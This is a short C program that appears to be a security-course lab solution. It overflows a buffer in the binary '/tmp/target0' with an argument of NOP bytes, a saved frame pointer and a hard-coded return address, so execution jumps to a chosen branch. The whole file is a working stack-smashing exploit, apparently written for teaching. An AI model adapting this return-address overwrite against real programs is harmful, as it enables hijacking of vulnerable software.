#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define TARGET "/tmp/target0"

// change return address to jump directly to the else part of the if statement
int main(void)
{
  char *args[3];
  char *env[1];

  // current return addr 0x0804850e
  // target return addr 0x0804851b
  // %ebp is 0xbffffdf8

  char *string = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
                  "\x90\x90\x90\x90\x90\xf8\xfd\xff\xbf"
                  "\x1d\x85\x04\x08";

  args[0] = TARGET; args[1] = string; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
